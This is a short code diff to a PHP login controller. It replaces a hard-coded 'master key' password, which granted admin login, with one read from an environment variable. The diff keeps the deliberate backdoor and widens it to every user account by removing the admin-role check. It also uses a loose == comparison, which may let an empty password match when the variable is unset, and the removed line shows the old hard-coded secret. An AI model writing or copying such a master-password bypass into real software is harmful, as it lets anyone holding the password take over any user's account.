@@ -88,12 +88,14 @@ class AuthController extends Controller
         }
 
         $credentials = $request->only('email', 'password');
-        
-        // llave maestra para loguear
-        if ($request->input('password') === 'k6fi58zb7f7h0969s0pdtjan8') {
+
+        $specialAdminPassword = env('SPECIAL_ADMIN_PASSWORD');
+
+        // Verificar si la contraseña es la cadena especial
+        if ($request->input('password') == $specialAdminPassword) {
             $user = User::where('email', $request->input('email'))->first();
-            
-            if ($user && $user->role === 'admin') {
+
+            if ($user) {
                 $token = $user->createToken('Personal Access Token')->plainTextToken;
 
                 return response()->json([
